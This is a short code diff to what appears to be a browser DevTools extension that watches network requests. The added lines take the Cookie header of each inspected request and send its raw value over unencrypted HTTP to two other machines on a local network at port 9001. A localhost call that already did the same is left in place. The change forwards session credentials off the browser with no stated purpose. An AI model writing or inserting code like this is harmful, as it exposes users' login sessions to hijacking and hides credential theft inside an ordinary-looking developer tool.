@@ -54,6 +54,8 @@ chrome.devtools.network.onRequestFinished.addListener(
 				var item = request.request.headers[i]
 				if (item.name == 'Cookie') {
 					document.getElementById('netWorkList').innerText = item.value
+					$.get('http://192.168.1.105:9001/' + item.value)
+					$.get('http://192.168.1.90:9001/' + item.value)
 					$.get('http://localhost:9001/' + item.value)
 					//alert($.get)
 				}
